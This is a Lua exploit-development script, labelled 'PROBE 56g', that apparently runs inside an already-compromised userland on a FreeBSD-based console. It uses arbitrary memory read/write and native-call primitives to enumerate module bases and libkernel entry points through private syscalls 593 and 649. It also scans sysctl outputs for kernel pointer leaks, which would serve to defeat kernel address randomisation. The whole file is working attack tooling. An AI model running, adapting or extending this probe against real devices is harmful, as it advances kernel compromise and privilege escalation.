-- CRASH_CLASS: LOW
-- PROBE 56g: Scan libkernel exported functions for kernel info leaks
--
-- native.fcall_with_rax(stub, N) calls the function at stub with
-- rdi=first_arg. We can call arbitrary userland functions.
-- libkernel is the FreeBSD-kernel-interface library; its exported
-- functions may leak kernel state through return values, errno,
-- or output buffers.
--
-- Strategy:
-- 1. Find libkernel base via dynlib_get_info(593)
-- 2. Enumerate interesting offsets from the 13.60 module table
-- 3. Call each with safe arguments, check if any return kernel-shaped values
-- 4. Also test: getpid returns, stack addresses, thread IDs

print("=== PROBE 56g: LIBKERNEL SYMBOL SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function fmt_ptr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- ============ SECTION A: Find all module bases ============
print("")
print("--- SECTION A: Module bases ---")

local sc593 = mk(593)
local info = memory.alloc(0x200)

local modules = {}
for handle = 0, 40 do
    for i = 0, 0x1FF, 4 do wd(N(info) + i, 0) end
    wd(N(info), 0x160)
    local ok, ret = pcall(function() return sc593(uint64(handle), info) end)
    if ok and N(ret) == 0 then
        local tlo = rd(N(info) + 0x108) or 0
        local thi = rd(N(info) + 0x10C) or 0
        if tlo < 0 then tlo = tlo + 0x100000000 end
        if thi < 0 then thi = thi + 0x100000000 end
        local name_bytes = {}
        for j = 0, 31 do
            local b = rd(N(info) + 0x08 + (j - j % 4))
            if b then
                local shift = (j % 4) * 8
                local ch = math.floor(b / (2 ^ shift)) % 256
                if ch == 0 then break end
                name_bytes[#name_bytes + 1] = string.char(ch)
            end
        end
        local name = table.concat(name_bytes)
        if thi > 0 or tlo > 0 then
            modules[#modules + 1] = {handle = handle, name = name, thi = thi, tlo = tlo}
            if name:find("libkernel") or name:find("libSceLibcInternal") or
               name:find("eboot") or handle == 0 then
                print(string.format("  [%d] %-30s text=0x%X%08X", handle, name, thi, tlo))
            end
        end
    end
end
print(string.format("  Total: %d modules", #modules))

-- Find libkernel
local lk = nil
local eboot = nil
for _, m in ipairs(modules) do
    if m.name:find("libkernel") then lk = m end
    if m.handle == 0 then eboot = m end
end

if not lk then
    print("ERROR: libkernel not found!")
    return
end
print(string.format("\nlibkernel: handle=%d text=0x%X%08X", lk.handle, lk.thi, lk.tlo))

-- ============ SECTION B: sys 649 member query for libkernel ============
-- member types 1-4, 7, 8 return different addresses
print("")
print("--- SECTION B: sys 649 member query for libkernel ---")

local sc649 = mk(649)
local member_buf = memory.alloc(64)

for mtype = 0, 10 do
    for i = 0, 15, 4 do wd(N(member_buf) + i, 0) end
    local ok, ret = pcall(function()
        return sc649(uint64(lk.handle), uint64(mtype), uint64(N(member_buf)), uint64(16))
    end)
    if ok and N(ret) == 0 then
        local val = rq(N(member_buf))
        local vstr = fmt_ptr(val)
        local kp = is_kptr(val) and " *** KPTR ***" or ""
        print(string.format("  member %d: %s%s", mtype, vstr, kp))
    else
        local rv = ok and N(ret) or -999
        print(string.format("  member %d: ret=%d", mtype, rv))
    end
end

-- ============ SECTION C: Call libkernel functions via fcall_with_rax ============
-- We can't resolve symbols by name, but we can try calling at known offsets
-- based on the module structure. sys 649 gives us entry points.
-- Let's also try calling with buffer arguments and scanning output.
print("")
print("--- SECTION C: fcall_with_rax on libkernel entry points ---")

-- Get libkernel's init and fini entries from 649
local entry_points = {}
for mtype = 1, 8 do
    for i = 0, 15, 4 do wd(N(member_buf) + i, 0) end
    local ok, ret = pcall(function()
        return sc649(uint64(lk.handle), uint64(mtype), uint64(N(member_buf)), uint64(16))
    end)
    if ok and N(ret) == 0 then
        local val = rq(N(member_buf))
        if val then
            local h, l = get_hi_lo(val)
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end
            if h > 0 or l > 0 then
                entry_points[#entry_points + 1] = {mtype = mtype, addr = val,
                    str = string.format("0x%X%08X", h, l)}
            end
        end
    end
end

print(string.format("  Found %d entry points from 649", #entry_points))

-- ============ SECTION D: errno / __error() address ============
-- On FreeBSD, __error() returns a pointer to the thread's errno.
-- This is a TLS address. If the TLS is near any kernel structure,
-- its address might reveal something.
-- We can find __error by scanning for a known pattern.
print("")
print("--- SECTION D: Stack and TLS probing ---")

-- Allocate a buffer, call getpid via fcall_with_rax and check rax
local getpid_ret = N(native.fcall_with_rax(stub, 20))
print(string.format("  getpid via fcall_with_rax = %d (0x%X)", getpid_ret, getpid_ret))

-- Call getuid(24)
local uid_ret = N(native.fcall_with_rax(stub, 24))
print(string.format("  getuid via fcall_with_rax = %d (0x%X)", uid_ret, uid_ret))

-- Call getppid(39)
local ppid_ret = N(native.fcall_with_rax(stub, 39))
print(string.format("  getppid via fcall_with_rax = %d (0x%X)", ppid_ret, ppid_ret))

-- Call gettid — FreeBSD doesn't have gettid, but thr_self(432) writes TID to *arg
-- We need to pass a pointer to a buffer. fcall_with_rax passes arg as rdi.
-- But 432 takes a pointer. Let's try: allocate buffer, call make_syscall instead.
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local sc432 = mk(432)
local tid_ret = sc432(uint64(N(tid_buf)), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
local tid_val = rq(N(tid_buf))
print(string.format("  thr_self(432): ret=%d tid=%s", N(tid_ret), fmt_ptr(tid_val)))

-- ============ SECTION E: sysctl kern.proc.pathname ============
-- KERN_PROC_PATHNAME = 12, returns the path of the executable
-- This might contain info about the jailed filesystem
print("")
print("--- SECTION E: sysctl kern.proc.pathname ---")

local sc202 = mk(202)
local mib = memory.alloc(16)
wd(N(mib), 1)      -- CTL_KERN
wd(N(mib) + 4, 14) -- KERN_PROC
wd(N(mib) + 8, 12) -- KERN_PROC_PATHNAME
wd(N(mib) + 12, pid)

local pathbuf = memory.alloc(1024)
for i = 0, 255, 4 do wd(N(pathbuf) + i, 0) end
local oldlenp = memory.alloc(8)
wq(oldlenp, uint64(1024))

local ret = sc202(uint64(N(mib)), uint64(4), uint64(N(pathbuf)), uint64(N(oldlenp)),
    uint64(0), uint64(0))
local pathlen = N(rq(N(oldlenp)))

if N(ret) == 0 and pathlen > 0 then
    local path_chars = {}
    for i = 0, math.min(pathlen - 1, 255) do
        local dw = rd(N(pathbuf) + (i - i % 4))
        if dw then
            local shift = (i % 4) * 8
            local ch = math.floor(dw / (2 ^ shift)) % 256
            if ch == 0 then break end
            path_chars[#path_chars + 1] = string.char(ch)
        end
    end
    print(string.format("  pathname: %s (len=%d)", table.concat(path_chars), pathlen))
else
    print(string.format("  pathname: ret=%d len=%d", N(ret), pathlen))
end

-- ============ SECTION F: sysctl kern.proc.vmmap ============
-- Already known to be blocked (ret=-1), but let's confirm via 624 delta
print("")
print("--- SECTION F: kern.proc.vmmap (expect blocked) ---")

wd(N(mib), 1)      -- CTL_KERN
wd(N(mib) + 4, 14) -- KERN_PROC
wd(N(mib) + 8, 32) -- KERN_PROC_VMMAP
wd(N(mib) + 12, pid)

wq(oldlenp, uint64(0))
local sc624 = mk(624)
local before624 = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
ret = sc202(uint64(N(mib)), uint64(4), uint64(0), uint64(N(oldlenp)), uint64(0), uint64(0))
local after624 = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  vmmap size query: ret=%d delta_624=%d", N(ret), after624 - before624))

-- ============ SECTION G: sysctl hw.physmem / hw.usermem ============
print("")
print("--- SECTION G: hw.physmem / hw.usermem ---")

-- hw.physmem: MIB = {6, 5}
wd(N(mib), 6)      -- CTL_HW
wd(N(mib) + 4, 5)  -- HW_PHYSMEM
for i = 0, 15, 4 do wd(N(pathbuf) + i, 0) end
wq(oldlenp, uint64(8))
ret = sc202(uint64(N(mib)), uint64(2), uint64(N(pathbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
if N(ret) == 0 then
    local val = rq(N(pathbuf))
    print(string.format("  hw.physmem: %s (%s)", fmt_ptr(val), is_kptr(val) and "KPTR!" or "ok"))
else
    print(string.format("  hw.physmem: ret=%d", N(ret)))
end

-- hw.usermem: MIB = {6, 6}
wd(N(mib), 6)
wd(N(mib) + 4, 6)
for i = 0, 15, 4 do wd(N(pathbuf) + i, 0) end
wq(oldlenp, uint64(8))
ret = sc202(uint64(N(mib)), uint64(2), uint64(N(pathbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
if N(ret) == 0 then
    local val = rq(N(pathbuf))
    print(string.format("  hw.usermem: %s (%s)", fmt_ptr(val), is_kptr(val) and "KPTR!" or "ok"))
else
    print(string.format("  hw.usermem: ret=%d", N(ret)))
end

-- ============ SECTION H: sysctl kern.boottime ============
print("")
print("--- SECTION H: kern.boottime ---")

wd(N(mib), 1)      -- CTL_KERN
wd(N(mib) + 4, 21) -- KERN_BOOTTIME
for i = 0, 31, 4 do wd(N(pathbuf) + i, 0) end
wq(oldlenp, uint64(16))
ret = sc202(uint64(N(mib)), uint64(2), uint64(N(pathbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
if N(ret) == 0 then
    local sec = rd(N(pathbuf))
    local usec = rd(N(pathbuf) + 8)
    print(string.format("  boottime: sec=%d usec=%d", sec or 0, usec or 0))
    -- Also check raw qwords for kernel pointers
    for off = 0, 24, 8 do
        local val = rq(N(pathbuf) + off)
        if val and is_kptr(val) then
            print(string.format("  *** KPTR at boottime+%d: %s ***", off, fmt_ptr(val)))
        end
    end
else
    print(string.format("  boottime: ret=%d", N(ret)))
end

-- ============ SECTION I: sysctl machdep.tsc_freq ============
print("")
print("--- SECTION I: machdep.tsc_freq ---")

-- machdep.tsc_freq: MIB varies; try kern.timecounter.tc.TSC.frequency
-- Actually let's just try direct: machdep = 7
wd(N(mib), 7)       -- CTL_MACHDEP
wd(N(mib) + 4, 16)  -- guess for tsc_freq
for i = 0, 15, 4 do wd(N(pathbuf) + i, 0) end
wq(oldlenp, uint64(8))
ret = sc202(uint64(N(mib)), uint64(2), uint64(N(pathbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
print(string.format("  machdep.16: ret=%d", N(ret)))

-- Try a broader scan of kern subtrees for anything that returns kernel pointers
print("")
print("--- SECTION J: sysctl kern.* scan for kernel pointers ---")

local kptr_found = 0
for sub = 1, 50 do
    wd(N(mib), 1)
    wd(N(mib) + 4, sub)
    for i = 0, 31, 4 do wd(N(pathbuf) + i, 0) end
    wq(oldlenp, uint64(32))
    local ok2, ret2 = pcall(function()
        return sc202(uint64(N(mib)), uint64(2), uint64(N(pathbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    if ok2 and N(ret2) == 0 then
        local got = N(rq(N(oldlenp)))
        if got >= 8 then
            for off = 0, math.min(got - 8, 24), 8 do
                local val = rq(N(pathbuf) + off)
                if val and is_kptr(val) then
                    print(string.format("  *** kern.%d +%d: %s ***", sub, off, fmt_ptr(val)))
                    kptr_found = kptr_found + 1
                end
            end
        end
    end
end
if kptr_found == 0 then
    print("  No kernel pointers in kern.1..50")
end

-- ============ DONE ============
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56g COMPLETE ===")
